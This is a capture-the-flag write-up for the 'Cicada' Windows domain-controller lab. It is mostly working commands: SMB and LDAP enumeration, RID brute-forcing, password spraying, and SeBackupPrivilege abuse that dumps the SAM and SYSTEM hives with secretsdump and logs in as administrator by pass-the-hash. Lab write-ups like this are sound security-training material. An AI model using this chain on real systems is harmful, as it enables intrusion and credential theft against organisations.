Difficulty: Easy

### Information Gathering

IP Address: 10.129.231.149

# User Flag
#### Service Enumeration

Enumeration of the services with NMAP.
```
sudo nmap 10.129.231.149
```

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
5985/tcp open  wsman
```

Enumeration of SMB as a guest session.
```
netexec smb cicada.htb -u 'guest' -p '' --shares
```

Access to `HR` and `IPC$` share.
`IPC$` share is empty, but `HR` contains a file.
```
smbclient //10.129.231.149/HR
```

```
smb: \> dir
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

		4168447 blocks of size 4096. 481198 blocks available
smb: \> get "Notice from HR.txt"
```

`Cicada$M6Corpb*@Lp#nZp!8`

```
netexec smb cicada.htb -u 'guest' -p '' --rid-brute
```

A list of users has been formed into `users.txt`
Some obvious group names have been excluded.
```
Administrator 
Guest 
krbtgt
CICADA-DC$ 
DnsAdmins 
DnsUpdateProxy 
Groups 
john.smoulder 
sarah.dantelia 
michael.wrightson 
david.orelious 
Dev Support 
emily.oscars 
```

```
netexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
```

However, nothing interesting appear in the shares.

```
ldapsearch -x -H ldap://10.129.231.149 -b "DC=cicada,DC=htb" -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' | grep -i pass
```

```
description: Just in case I forget my password is aRt$Lp#7t*VQ!3
```

```
netexec smb cicada.htb -u users.txt -p 'aRt$Lp#7t*VQ!3' --continue-on-success
```

`david.orelious:aRt$Lp#7t*VQ!3` are valid credentials.

```
netexec smb cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
```

Access to the `DEV` share.
```
smbclient //10.129.231.149/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
```

```
smb: \> dir
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

		4168447 blocks of size 4096. 477966 blocks available
smb: \> get Backup_script.ps1
```

After reading this script, we find new credentials.

`emily.oscars:Q!3@Lp#M6b*7t*Vt`

```
netexec winrm cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

```
evil-winrm -i cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

The user flag has been obtained.
![[Screenshot 2026-07-25 at 02.40.17.png]]

# Root Flag
#### Privilege Escalation - SeBackupPrivilege Exploit

```
whoami /priv
```

This user has `SeBackupPrivilege` enabled.

The sam and system files can be transferred directly to the system.
```
reg save hklm\sam C:\windows\temp\SAM
reg save hklm\system C:\windows\temp\SYSTEM
```

From the WinRM session, they will be transferred to the attacker's host.
```
download SAM
download SYSTEM
```

The hashes can now be dumped from secretsdump.
```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

WinRM session is now initiated.
```
evil-winrm -i -i cicada.htb -u 'administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'
```

Root flag successfully obtained.
![[Screenshot 2026-07-25 at 02.55.57.png]]

